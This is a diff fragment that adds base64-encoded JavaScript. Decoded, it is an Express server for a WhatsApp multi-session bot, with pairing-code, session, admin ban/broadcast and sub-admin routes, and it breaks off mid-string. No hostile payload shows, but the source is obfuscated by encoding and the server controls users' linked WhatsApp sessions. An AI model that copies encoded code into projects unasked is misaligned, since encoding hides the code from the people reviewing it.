+    "bHdheXMgcmV0dXJucyAyMDAgcXVpY2tseSBmb3Iga2VlcGFsaXZlCmFwcC5nZXQoJy9hcGkvcGluZycs",
+    "IChyZXEsIHJlcykgPT4gcmVzLmpzb24oeyBvazogdHJ1ZSwgdHM6IERhdGUubm93KCkgfSkpOwoKYXBw",
+    "LmdldCgnL2FwaS9oZWFsdGgnLCAocmVxLCByZXMpID0+IHsKICBjb25zdCBtZW0gPSBwcm9jZXNzLm1l",
+    "bW9yeVVzYWdlKCk7CiAgY29uc3QgdXAgID0gTWF0aC5mbG9vcihwcm9jZXNzLnVwdGltZSgpKTsKICBj",
+    "b25zdCBoPU1hdGguZmxvb3IodXAvMzYwMCksIG09TWF0aC5mbG9vcigodXAlMzYwMCkvNjApLCBzPXVw",
+    "JTYwOwogIGNvbnN0IHNlc3Npb25zID0gZ2V0QWxsU2Vzc2lvbnMoKTsKICByZXMuanNvbih7CiAgICBz",
+    "dWNjZXNzOiB0cnVlLCBzdGF0dXM6ICdhbGl2ZScsCiAgICB1cHRpbWU6IGAke2h9aCAke219bSAke3N9",
+    "c2AsIHVwdGltZV9zOiB1cCwKICAgIHNlc3Npb25zOiBzZXNzaW9ucy5sZW5ndGgsCiAgICBhY3RpdmU6",
+    "IHNlc3Npb25zLmZpbHRlcihzID0+IHMuaXNBY3RpdmUpLmxlbmd0aCwKICAgIG1lbW9yeV9tYjogKG1l",
+    "bS5oZWFwVXNlZC8xMDI0LzEwMjQpLnRvRml4ZWQoMSksCiAgICBub2RlOiBwcm9jZXNzLnZlcnNpb24s",
+    "CiAgICBwbGF0Zm9ybTogcHJvY2Vzcy5wbGF0Zm9ybSwKICAgIHRpbWVzdGFtcDogbmV3IERhdGUoKS50",
+    "b0lTT1N0cmluZygpLAogIH0pOwp9KTsKLy8gQWxpYXMKYXBwLmdldCgnL2FwaS9oZWFsdGgvanNvbics",
+    "IChyZXEsIHJlcykgPT4gcmVzLnJlZGlyZWN0KCcvYXBpL2hlYWx0aCcpKTsKCi8vIFBhaXIgIOKAlCA1",
+    "IHJlcXVlc3RzIHBlciBtaW51dGUgcGVyIElQCmFwcC5wb3N0KCcvYXBpL3BhaXInLCByYXRlTGltaXRl",
+    "cih7IG1heDogNSwgd2luZG93OiA2MCwgbWVzc2FnZTogJ+KPsyBUb28gbWFueSBwYWlyaW5nIHJlcXVl",
+    "c3RzLiBQbGVhc2Ugd2FpdCA2MCBzZWNvbmRzLicgfSksIGFzeW5jIChyZXEsIHJlcykgPT4gewogIHRy",
+    "eSB7CiAgICBjb25zdCB7IHVzZXJJZCwgcGhvbmVOdW1iZXIgfSA9IHJlcS5ib2R5OwogICAgaWYgKCFw",
+    "aG9uZU51bWJlcikgcmV0dXJuIHJlcy5zdGF0dXMoNDAwKS5qc29uKHsgc3VjY2VzczogZmFsc2UsIG1l",
+    "c3NhZ2U6ICfinYwgUGhvbmUgbnVtYmVyIHJlcXVpcmVkJyB9KTsKICAgIGNvbnN0IGNsZWFuID0gU3Ry",
+    "aW5nKHBob25lTnVtYmVyKS5yZXBsYWNlKC9cRC9nLCAnJyk7CiAgICBpZiAoY2xlYW4ubGVuZ3RoIDwg",
+    "NykgcmV0dXJuIHJlcy5zdGF0dXMoNDAwKS5qc29uKHsgc3VjY2VzczogZmFsc2UsIG1lc3NhZ2U6ICfi",
+    "nYwgSW52YWxpZCBwaG9uZSBudW1iZXInIH0pOwogICAgY29uc3QgdWlkID0gdXNlcklkIHx8IGB1c2Vy",
+    "XyR7RGF0ZS5ub3coKX1fJHtjbGVhbn1gOwogICAgaWYgKGlzVXNlclJlc3RyaWN0ZWQodWlkKSkgcmV0",
+    "dXJuIHJlcy5zdGF0dXMoNDAzKS5qc29uKHsgc3VjY2VzczogZmFsc2UsIG1lc3NhZ2U6ICfwn5qrIEFj",
+    "Y291bnQgcmVzdHJpY3RlZCcgfSk7CgogICAgLy8g4pSA4pSAIENSSVRJQ0FMIEZJWDogUmVnaXN0ZXIg",
+    "c2Vzc2lvbiBJTU1FRElBVEVMWSAoaW5hY3RpdmUpIGJlZm9yZSBzb2NrZXQgc3RhcnRzLgogICAgLy8g",
+    "ICAgVGhpcyBlbnN1cmVzIHRoZSBzZXNzaW9uSWQgZXhpc3RzIGluIHRoZSBzdG9yZSByaWdodCBub3cs",
+    "IGlzIHJldHVybmVkIGluCiAgICAvLyAgICB0aGlzIHJlc3BvbnNlLCBhcHBlYXJzIGluIGFkbWluIHNl",
+    "YXJjaCBpbnN0YW50bHksIGFuZCBwZXJzaXN0cyBhY3Jvc3MgcmVzdGFydHMuCiAgICAvLyAgICBUaGUg",
+    "c2Vzc2lvbiBzdGF5cyBpbmFjdGl2ZSB1bnRpbCBhbiBvd25lci9hZG1pbiBleHBsaWNpdGx5IGFjdGl2",
+    "YXRlcyBpdC4KICAgIGNvbnN0IHNlc3Npb25JZCA9IHNzLnJlZ2lzdGVyKHVpZCwgY2xlYW4pOwogICAg",
+    "bG9nZ2VyLmluZm8oYPCfk7EgUGFpciByZXF1ZXN0OiAke2NsZWFufSDihpIgJHt1aWR9IHwgU2Vzc2lv",
+    "biBwcmUtcmVnaXN0ZXJlZDogJHtzZXNzaW9uSWR9YCk7CgogICAgY29uc3QgcmVzdWx0ID0gYXdhaXQg",
+    "c3RhcnRTZXNzaW9uKHVpZCwgY2xlYW4pOwogICAgaWYgKHJlc3VsdD8uY29kZSkgewogICAgICByZXR1",
+    "cm4gcmVzLmpzb24oewogICAgICAgIHN1Y2Nlc3M6ICAgICB0cnVlLAogICAgICAgIGNvZGU6ICAgICAg",
+    "ICByZXN1bHQuY29kZSwKICAgICAgICB1c2VySWQ6ICAgICAgdWlkLAogICAgICAgIHBob25lTnVtYmVy",
+    "OiBjbGVhbiwKICAgICAgICBzZXNzaW9uSWQsCiAgICAgICAgbWVzc2FnZTogICAgICfinIUgRW50ZXIg",
+    "dGhpcyBjb2RlIGluIFdoYXRzQXBwIOKGkiBMaW5rZWQgRGV2aWNlcycsCiAgICAgIH0pOwogICAgfQog",
+    "ICAgcmV0dXJuIHJlcy5zdGF0dXMoNDAwKS5qc29uKHsgc3VjY2VzczogZmFsc2UsIG1lc3NhZ2U6ICfi",
+    "nYwgQ291bGQgbm90IGdlbmVyYXRlIHBhaXJpbmcgY29kZS4gVHJ5IGFnYWluLicgfSk7CiAgfSBjYXRj",
+    "aCAoZSkgewogICAgbG9nZ2VyLmVycm9yKCdQT1NUIC9hcGkvcGFpcjonLCBlLm1lc3NhZ2UpOwogICAg",
+    "Y29uc3QgbXNnID0gZS5tZXNzYWdlLmluY2x1ZGVzKCdUSU1FT1VUJykgPyAn4o+x77iPIFRpbWVkIG91",
+    "dCDigJQgdHJ5IGFnYWluJyA6IGDwn5S0ICR7ZS5tZXNzYWdlfWA7CiAgICByZXMuc3RhdHVzKDUwMCku",
+    "anNvbih7IHN1Y2Nlc3M6IGZhbHNlLCBtZXNzYWdlOiBtc2cgfSk7CiAgfQp9KTsKCi8vIFJlc2V0IHBh",
+    "aXIKYXBwLnBvc3QoJy9hcGkvcGFpci9yZXNldCcsIChyZXEsIHJlcykgPT4gewogIHRyeSB7CiAgICBj",
+    "b25zdCB7IHVzZXJJZCB9ID0gcmVxLmJvZHk7CiAgICBpZiAodXNlcklkKSBjYW5jZWxTZXNzaW9uKHVz",
+    "ZXJJZCk7CiAgICByZXMuanNvbih7IHN1Y2Nlc3M6IHRydWUsIG1lc3NhZ2U6ICfinIUgUmVzZXQg4oCU",
+    "IHBhaXIgYWdhaW4nIH0pOwogIH0gY2F0Y2ggKGUpIHsgcmVzLnN0YXR1cyg1MDApLmpzb24oeyBzdWNj",
+    "ZXNzOiBmYWxzZSwgbWVzc2FnZTogZS5tZXNzYWdlIH0pOyB9Cn0pOwoKLy8gU2Vzc2lvbnMKYXBwLmdl",
+    "dCgnL2FwaS9zZXNzaW9ucycsIChyZXEsIHJlcykgPT4gewogIHRyeSB7IHJlcy5qc29uKHsgc3VjY2Vz",
+    "czogdHJ1ZSwgc2Vzc2lvbnM6IGdldEFsbFNlc3Npb25zKCksIGNvdW50OiBnZXRBbGxTZXNzaW9ucygp",
+    "Lmxlbmd0aCB9KTsgfQogIGNhdGNoIChlKSB7IHJlcy5zdGF0dXMoNTAwKS5qc29uKHsgc3VjY2Vzczog",
+    "ZmFsc2UsIG1lc3NhZ2U6IGUubWVzc2FnZSB9KTsgfQp9KTsKCmFwcC5nZXQoJy9hcGkvc2Vzc2lvbi86",
+    "dXNlcklkJywgKHJlcSwgcmVzKSA9PiB7CiAgdHJ5IHsKICAgIGNvbnN0IHMgPSBnZXRTZXNzaW9uKHJl",
+    "cS5wYXJhbXMudXNlcklkKTsKICAgIGlmICghcykgcmV0dXJuIHJlcy5zdGF0dXMoNDA0KS5qc29uKHsg",
+    "c3VjY2VzczogZmFsc2UsIG1lc3NhZ2U6ICdTZXNzaW9uIG5vdCBmb3VuZCcgfSk7CiAgICByZXMuanNv",
+    "bih7IHN1Y2Nlc3M6IHRydWUsIHBob25lTnVtYmVyOiBzLnBob25lTnVtYmVyLCBpc0FjdGl2ZTogISEo",
+    "cy5zb2NrPy51c2VyKSwgY3JlYXRlZEF0OiBzLmNyZWF0ZWRBdCB9KTsKICB9IGNhdGNoIChlKSB7IHJl",
+    "cy5zdGF0dXMoNTAwKS5qc29uKHsgc3VjY2VzczogZmFsc2UsIG1lc3NhZ2U6IGUubWVzc2FnZSB9KTsg",
+    "fQp9KTsKCi8vIENvbW1hbmRzIGxpc3QKYXBwLmdldCgnL2FwaS9jb21tYW5kcycsIChyZXEsIHJlcykg",
+    "PT4gewogIHRyeSB7CiAgICByZXMuanNvbih7IHN1Y2Nlc3M6IHRydWUsIGNvbW1hbmRzOiBnZXRBdmFp",
+    "bGFibGVDb21tYW5kcygpLCBwcmVmaXg6IHByb2Nlc3MuZW52LkJPVF9QUkVGSVggfHwgJyEnIH0pOwog",
+    "IH0gY2F0Y2ggKGUpIHsgcmVzLnN0YXR1cyg1MDApLmpzb24oeyBzdWNjZXNzOiBmYWxzZSwgbWVzc2Fn",
+    "ZTogZS5tZXNzYWdlIH0pOyB9Cn0pOwoKLy8g4pSA4pSAIEFkbWluIEFQSSAocmVxdWlyZXMgYXV0aCAr",
+    "IENTUkYpIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgApj",
+    "b25zdCByZXF1aXJlQWRtaW4gPSAocmVxLCByZXMsIG5leHQpID0+CiAgcmVxLnNlc3Npb24/LmFkbWlu",
+    "QXV0aCA/IG5leHQoKSA6IHJlcy5zdGF0dXMoNDAxKS5qc29uKHsgc3VjY2VzczogZmFsc2UsIG1lc3Nh",
+    "Z2U6ICdVbmF1dGhvcml6ZWQnIH0pOwoKLy8gQ1NSRiBjaGVjayBmb3IgSlNPTiBBUEkgY2FsbHMg4oCU",
+    "IHJlYWRzIGZyb20gWC1DU1JGLVRva2VuIGhlYWRlciBvciBfY3NyZiBib2R5IGZpZWxkCmNvbnN0IGNz",
+    "cmZDaGVja0FQSSA9IChyZXEsIHJlcywgbmV4dCkgPT4gewogIGNvbnN0IHRvayA9IHJlcS5oZWFkZXJz",
+    "Py5bJ3gtY3NyZi10b2tlbiddIHx8IHJlcS5ib2R5Py5fY3NyZjsKICBpZiAoIXRvayB8fCB0b2sgIT09",
+    "IHJlcS5zZXNzaW9uPy5jc3JmVG9rZW4pCiAgICByZXR1cm4gcmVzLnN0YXR1cyg0MDMpLmpzb24oeyBz",
+    "dWNjZXNzOiBmYWxzZSwgbWVzc2FnZTogJ0NTUkYgdG9rZW4gaW52YWxpZC4gUmVmcmVzaCB0aGUgYWRt",
+    "aW4gcGFnZS4nIH0pOwogIG5leHQoKTsKfTsKCmFwcC5wb3N0KCcvYXBpL2FkbWluL2Jhbi11c2VyJywg",
+    "cmVxdWlyZUFkbWluLCBjc3JmQ2hlY2tBUEksIChyZXEsIHJlcykgPT4gewogIHRyeSB7CiAgICBjb25z",
+    "dCB7IHVzZXJJZCwgcmVhc29uIH0gPSByZXEuYm9keTsKICAgIGlmICghdXNlcklkKSByZXR1cm4gcmVz",
+    "LnN0YXR1cyg0MDApLmpzb24oeyBzdWNjZXNzOiBmYWxzZSwgbWVzc2FnZTogJ3VzZXJJZCByZXF1aXJl",
+    "ZCcgfSk7CiAgICBhZGRSZXN0cmljdGVkVXNlcih1c2VySWQsIHJlYXNvbiB8fCAnQmFubmVkIGJ5IGFk",
+    "bWluJyk7CiAgICBkZWxldGVTZXNzaW9uKHVzZXJJZCk7CiAgICByZXMuanNvbih7IHN1Y2Nlc3M6IHRy",
+    "dWUsIG1lc3NhZ2U6IGDwn5SoICR7dXNlcklkfSBiYW5uZWQgYW5kIHNlc3Npb24gZGVsZXRlZGAgfSk7",
+    "CiAgfSBjYXRjaCAoZSkgeyByZXMuc3RhdHVzKDUwMCkuanNvbih7IHN1Y2Nlc3M6IGZhbHNlLCBtZXNz",
+    "YWdlOiBlLm1lc3NhZ2UgfSk7IH0KfSk7CgphcHAucG9zdCgnL2FwaS9hZG1pbi9yZXN0cmljdC11c2Vy",
+    "JywgcmVxdWlyZUFkbWluLCBjc3JmQ2hlY2tBUEksIChyZXEsIHJlcykgPT4gewogIHRyeSB7CiAgICBj",
+    "b25zdCB7IHVzZXJJZCwgcmVhc29uIH0gPSByZXEuYm9keTsKICAgIGlmICghdXNlcklkKSByZXR1cm4g",
+    "cmVzLnN0YXR1cyg0MDApLmpzb24oeyBzdWNjZXNzOiBmYWxzZSwgbWVzc2FnZTogJ3VzZXJJZCByZXF1",
+    "aXJlZCcgfSk7CiAgICBhZGRSZXN0cmljdGVkVXNlcih1c2VySWQsIHJlYXNvbiB8fCAnUmVzdHJpY3Rl",
+    "ZCcpOwogICAgZGVsZXRlU2Vzc2lvbih1c2VySWQpOwogICAgcmVzLmpzb24oeyBzdWNjZXNzOiB0cnVl",
+    "LCBtZXNzYWdlOiBg8J+aqyAke3VzZXJJZH0gcmVzdHJpY3RlZGAgfSk7CiAgfSBjYXRjaCAoZSkgeyBy",
+    "ZXMuc3RhdHVzKDUwMCkuanNvbih7IHN1Y2Nlc3M6IGZhbHNlLCBtZXNzYWdlOiBlLm1lc3NhZ2UgfSk7",
+    "IH0KfSk7CgphcHAucG9zdCgnL2FwaS9hZG1pbi91bnJlc3RyaWN0LXVzZXInLCByZXF1aXJlQWRtaW4s",
+    "IGNzcmZDaGVja0FQSSwgKHJlcSwgcmVzKSA9PiB7CiAgdHJ5IHsKICAgIGNvbnN0IHsgdXNlcklkIH0g",
+    "PSByZXEuYm9keTsKICAgIGlmICghdXNlcklkKSByZXR1cm4gcmVzLnN0YXR1cyg0MDApLmpzb24oeyBz",
+    "dWNjZXNzOiBmYWxzZSwgbWVzc2FnZTogJ3VzZXJJZCByZXF1aXJlZCcgfSk7CiAgICByZW1vdmVSZXN0",
+    "cmljdGVkVXNlcih1c2VySWQpOwogICAgcmVzLmpzb24oeyBzdWNjZXNzOiB0cnVlLCBtZXNzYWdlOiBg",
+    "4pyFICR7dXNlcklkfSB1bnJlc3RyaWN0ZWRgIH0pOwogIH0gY2F0Y2ggKGUpIHsgcmVzLnN0YXR1cyg1",
+    "MDApLmpzb24oeyBzdWNjZXNzOiBmYWxzZSwgbWVzc2FnZTogZS5tZXNzYWdlIH0pOyB9Cn0pOwoKYXBw",
+    "LnBvc3QoJy9hcGkvYWRtaW4vZGVsZXRlLXVzZXInLCByZXF1aXJlQWRtaW4sIGNzcmZDaGVja0FQSSwg",
+    "KHJlcSwgcmVzKSA9PiB7CiAgdHJ5IHsKICAgIGNvbnN0IHsgdXNlcklkIH0gPSByZXEuYm9keTsKICAg",
+    "IGlmICghdXNlcklkKSByZXR1cm4gcmVzLnN0YXR1cyg0MDApLmpzb24oeyBzdWNjZXNzOiBmYWxzZSwg",
+    "bWVzc2FnZTogJ3VzZXJJZCByZXF1aXJlZCcgfSk7CiAgICBjb25zdCBkZWxldGVkID0gZGVsZXRlU2Vz",
+    "c2lvbih1c2VySWQpOwogICAgcmVzLmpzb24oeyBzdWNjZXNzOiB0cnVlLCBtZXNzYWdlOiBkZWxldGVk",
+    "ID8gYOKchSBEZWxldGVkICR7dXNlcklkfWAgOiBg4oS577iPIE5vIGFjdGl2ZSBzZXNzaW9uIGZvciAk",
+    "e3VzZXJJZH1gIH0pOwogIH0gY2F0Y2ggKGUpIHsgcmVzLnN0YXR1cyg1MDApLmpzb24oeyBzdWNjZXNz",
+    "OiBmYWxzZSwgbWVzc2FnZTogZS5tZXNzYWdlIH0pOyB9Cn0pOwoKYXBwLnBvc3QoJy9hcGkvYWRtaW4v",
+    "YWRkLXVzZXInLCByZXF1aXJlQWRtaW4sIGNzcmZDaGVja0FQSSwgYXN5bmMgKHJlcSwgcmVzKSA9PiB7",
+    "CiAgdHJ5IHsKICAgIGNvbnN0IHsgcGhvbmVOdW1iZXIgfSA9IHJlcS5ib2R5OwogICAgaWYgKCFwaG9u",
+    "ZU51bWJlcikgcmV0dXJuIHJlcy5zdGF0dXMoNDAwKS5qc29uKHsgc3VjY2VzczogZmFsc2UsIG1lc3Nh",
+    "Z2U6ICdwaG9uZU51bWJlciByZXF1aXJlZCcgfSk7CiAgICBjb25zdCBjbGVhbiA9IHBob25lTnVtYmVy",
+    "LnJlcGxhY2UoL1xEL2csICcnKTsKICAgIGNvbnN0IHVpZCAgID0gYGFkbWluXyR7RGF0ZS5ub3coKX1f",
+    "JHtjbGVhbn1gOwogICAgYXdhaXQgc3RhcnRTZXNzaW9uKHVpZCwgY2xlYW4pOwogICAgcmVzLmpzb24o",
+    "eyBzdWNjZXNzOiB0cnVlLCBtZXNzYWdlOiBg4pyFIFNlc3Npb24gc3RhcnRlZCBmb3IgJHtjbGVhbn1g",
+    "LCB1c2VySWQ6IHVpZCB9KTsKICB9IGNhdGNoIChlKSB7IHJlcy5zdGF0dXMoNTAwKS5qc29uKHsgc3Vj",
+    "Y2VzczogZmFsc2UsIG1lc3NhZ2U6IGUubWVzc2FnZSB9KTsgfQp9KTsKCmFwcC5wb3N0KCcvYXBpL2Fk",
+    "bWluL2Jyb2FkY2FzdCcsIHJlcXVpcmVBZG1pbiwgY3NyZkNoZWNrQVBJLCBhc3luYyAocmVxLCByZXMp",
+    "ID0+IHsKICB0cnkgewogICAgY29uc3QgeyBtZXNzYWdlIH0gPSByZXEuYm9keTsKICAgIGlmICghbWVz",
+    "c2FnZT8udHJpbSgpKSByZXR1cm4gcmVzLnN0YXR1cyg0MDApLmpzb24oeyBzdWNjZXNzOiBmYWxzZSwg",
+    "bWVzc2FnZTogJ21lc3NhZ2UgcmVxdWlyZWQnIH0pOwogICAgY29uc3QgYWxsID0gZ2V0QWxsU2Vzc2lv",
+    "bnMoKTsKICAgIGxldCBvayA9IDAsIGZhaWwgPSAwOwogICAgZm9yIChjb25zdCBzIG9mIGFsbCkgewog",
+    "ICAgICBjb25zdCBzZXNzID0gZ2V0U2Vzc2lvbihzLnVzZXJJZCk7CiAgICAgIGlmICghc2Vzcz8uc29j",
+    "az8udXNlcikgeyBmYWlsKys7IGNvbnRpbnVlOyB9CiAgICAgIHRyeSB7CiAgICAgICAgYXdhaXQgc2Vz",
+    "cy5zb2NrLnNlbmRNZXNzYWdlKAogICAgICAgICAgc2Vzcy5zb2NrLnVzZXIuaWQuc3BsaXQoJzonKVsw",
+    "XSArICdAcy53aGF0c2FwcC5uZXQnLAogICAgICAgICAgeyB0ZXh0OiBtZXNzYWdlIH0KICAgICAgICAp",
+    "OwogICAgICAgIG9rKys7CiAgICAgIH0gY2F0Y2ggKF8pIHsgZmFpbCsrOyB9CiAgICB9CiAgICByZXMu",
+    "anNvbih7IHN1Y2Nlc3M6IHRydWUsIG1lc3NhZ2U6IGDinIUgU2VudDogJHtva30sIEZhaWxlZDogJHtm",
+    "YWlsfWAgfSk7CiAgfSBjYXRjaCAoZSkgeyByZXMuc3RhdHVzKDUwMCkuanNvbih7IHN1Y2Nlc3M6IGZh",
+    "bHNlLCBtZXNzYWdlOiBlLm1lc3NhZ2UgfSk7IH0KfSk7CgovLyDilIDilIAgQWRtaW4gVUkg4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "CmFwcC51c2UoJy9hZG1pbicsIGFkbWluUm91dGVzKTsKYXBwLnVzZSgnL3N1YicsICAgc3ViUm91dGVz",
+    "KTsKCgovLyDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIAKLy8gQVBJIFJPVVRFUyDigJQgYWxsIGJlZm9yZSB0aGUgNDA0IGhhbmRsZXIKLy8g4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACgovLyDilIDilIAgU3Vi",
+    "LUFkbWluIE1hbmFnZW1lbnQgQVBJIChPd25lciBvbmx5KSDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIAKYXBwLnBvc3QoJy9hcGkvc3ViLWFkbWluL2NyZWF0ZScs",
+    "IHJlcXVpcmVBZG1pbiwgY3NyZkNoZWNrQVBJLCAocmVxLCByZXMpID0+IHsKICB0cnkgewogICAgY29u",
+    "c3QgeyB1c2VybmFtZSwgZW1haWwsIHBhc3N3b3JkIH0gPSByZXEuYm9keTsKICAgIGNvbnN0IHF1b3Rh",
+    "ID0gcmVxLmJvZHkucXVvdGEgfHwgcmVxLmJvZHkuc2Vzc2lvbkxpbWl0IHx8IDU7CiAgICBpZiAoIXVz",
+    "ZXJuYW1lIHx8ICFlbWFpbCB8fCAhcGFzc3dvcmQpCiAgICAgIHJldHVybiByZXMuc3RhdHVzKDQwMCku",
+    "anNvbih7IHN1Y2Nlc3M6IGZhbHNlLCBtZXNzYWdlOiAnQWxsIGZpZWxkcyByZXF1aXJlZCcgfSk7CiAg",
+    "ICBjb25zdCBleGlzdGluZyA9IHN1YkFkbWluU3RvcmUuZ2V0QWxsKCkuZmluZChhID0+IGEudXNlcm5h",
+    "bWUgPT09IHVzZXJuYW1lLnRyaW0oKSB8fCBhLmVtYWlsID09PSBlbWFpbC50cmltKCkudG9Mb3dlckNh",
+    "c2UoKSk7CiAgICBpZiAoZXhpc3RpbmcpCiAgICAgIHJldHVybiByZXMuc3RhdHVzKDQwMCkuanNvbih7",
+    "IHN1Y2Nlc3M6IGZhbHNlLCBtZXNzYWdlOiAnVXNlcm5hbWUgb3IgZW1haWwgYWxyZWFkeSBleGlzdHMn",
+    "IH0pOwogICAgY29uc3QgYWRtaW4gPSBzdWJBZG1pblN0b3JlLmNyZWF0ZUFkbWluKHVzZXJuYW1lLnRy",
+    "aW0oKSwgZW1haWwudHJpbSgpLnRvTG93ZXJDYXNlKCksIHBhc3N3b3JkLCBxdW90YSk7CiAgICBsb2dn",
+    "ZXIuaW5mbygnT3duZXIgY3JlYXRlZCBzdWItYWRtaW46ICcgKyBhZG1pbi51c2VybmFtZSk7CiAgICBy",
+    "ZXMuanNvbih7IHN1Y2Nlc3M6IHRydWUsIG1lc3NhZ2U6ICfinIUgU3ViLWFkbWluICcgKyBhZG1pbi51",
+    "c2VybmFtZSArICcgY3JlYXRlZCBzdWNjZXNzZnVsbHknIH0pOwogIH0gY2F0Y2goZSkgeyByZXMuc3Rh",
+    "dHVzKDUwMCkuanNvbih7IHN1Y2Nlc3M6IGZhbHNlLCBtZXNzYWdlOiBlLm1lc3NhZ2UgfSk7IH0KfSk7",
+    "CgphcHAucG9zdCgnL2FwaS9zdWItYWRtaW4vZGVsZXRlJywgcmVxdWlyZUFkbWluLCBjc3JmQ2hlY2tB",
+    "UEksIChyZXEsIHJlcykgPT4gewogIHRyeSB7CiAgICBjb25zdCB7IGlkIH0gPSByZXEuYm9keTsKICAg",
+    "IGNvbnN0IGFkbWluID0gc3ViQWRtaW5TdG9yZS5nZXRCeUlkKGlkKTsKICAgIGlmICghYWRtaW4pIHJl",
+    "dHVybiByZXMuc3RhdHVzKDQwNCkuanNvbih7IHN1Y2Nlc3M6IGZhbHNlLCBtZXNzYWdlOiAnU3ViLWFk",
+    "bWluIG5vdCBmb3VuZCcgfSk7CiAgICBzdWJBZG1pblN0b3JlLmRlbGV0ZUFkbWluKGlkKTsKICAgIHJl",
+    "cy5qc29uKHsgc3VjY2VzczogdHJ1ZSwgbWVzc2FnZTogYWRtaW4udXNlcm5hbWUgKyAnIGRlbGV0ZWQn",
+    "IH0pOwogIH0gY2F0Y2goZSkgeyByZXMuc3RhdHVzKDUwMCkuanNvbih7IHN1Y2Nlc3M6IGZhbHNlLCBt",
+    "ZXNzYWdlOiBlLm1lc3NhZ2UgfSk7IH0KfSk7CgphcHAucG9zdCgnL2FwaS9zdWItYWRtaW4vcXVvdGEn",
+    "LCByZXF1aXJlQWRtaW4sIGNzcmZDaGVja0FQSSwgKHJlcSwgcmVzKSA9PiB7CiAgdHJ5IHsKICAgIGNv",
+    "bnN0IHsgaWQsIHF1b3RhIH0gPSByZXEuYm9keTsKICAgIHN1YkFkbWluU3RvcmUudXBkYXRlUXVvdGEo",
+    "aWQsIHF1b3RhKTsKICAgIHJlcy5qc29uKHsgc3VjY2VzczogdHJ1ZSwgbWVzc2FnZTogJ1F1b3RhIHVw",
+    "ZGF0ZWQgdG8gJyArIHF1b3RhIH0pOwogIH0gY2F0Y2goZSkgeyByZXMuc3RhdHVzKDUwMCkuanNvbih7",
+    "IHN1Y2Nlc3M6IGZhbHNlLCBtZXNzYWdlOiBlLm1lc3NhZ2UgfSk7IH0KfSk7CgphcHAucG9zdCgnL2Fw",
+    "aS9zdWItYWRtaW4vdG9nZ2xlJywgcmVxdWlyZUFkbWluLCBjc3JmQ2hlY2tBUEksIChyZXEsIHJlcykg",
+    "PT4gewogIHRyeSB7CiAgICBjb25zdCB7IGlkIH0gPSByZXEuYm9keTsKICAgIGNvbnN0IGFkbWluID0g",
+    "c3ViQWRtaW5TdG9yZS5nZXRCeUlkKGlkKTsKICAgIGlmICghYWRtaW4pIHJldHVybiByZXMuc3RhdHVz",
+    "KDQwNCkuanNvbih7IHN1Y2Nlc3M6IGZhbHNlLCBtZXNzYWdlOiAnTm90IGZvdW5kJyB9KTsKICAgIGNv",
+    "bnN0IGQgPSByZXF1aXJlKCcuL3V0aWxzL3N1YkFkbWluU3RvcmUnKTsKICAgIGNvbnN0IGFsbCA9IGQu",
+    "Z2V0QWxsID8gcmVxdWlyZSgnLi91dGlscy9zdWJBZG1pblN0b3JlJykgOiBudWxsOwogICAgLy8gVG9n",
+    "Z2xlIGFjdGl2ZSBzdGF0ZQogICAgY29uc3QgZnMgICA9IHJlcXVpcmUoJ2ZzJyk7CiAgICBjb25zdCBw",
+    "YXRoID0gcmVxdWlyZSgncGF0aCcpOwogICAgY29uc3QgRklMRSA9IHBhdGguam9pbihfX2Rpcm5hbWUs",
+    "ICcuLi9kYXRhL3N1Yl9hZG1pbnMuanNvbicpOwogICAgY29uc3QgZGF0YSA9IEpTT04ucGFyc2UoZnMu",
+    "cmVhZEZpbGVTeW5jKEZJTEUsJ3V0ZjgnKSk7CiAgICBpZiAoZGF0YVtpZF0pIHsKICAgICAgZGF0YVtp",
+    "ZF0uYWN0aXZlID0gIWRhdGFbaWRdLmFjdGl2ZTsKICAgICAgZnMud3JpdGVGaWxlU3luYyhGSUxFLCBK",
+    "U09OLnN0cmluZ2lmeShkYXRhLCBudWxsLCAyKSk7CiAgICB9CiAgICByZXMuanNvbih7IHN1Y2Nlc3M6",
+    "IHRydWUsIG1lc3NhZ2U6IChkYXRhW2lkXT8uYWN0aXZlID8gJ0VuYWJsZWQnIDogJ0Rpc2FibGVkJykg",
+    "KyAnICcgKyBhZG1pbi51c2VybmFtZSB9KTsKICB9IGNhdGNoKGUpIHsgcmVzLnN0YXR1cyg1MDApLmpz",
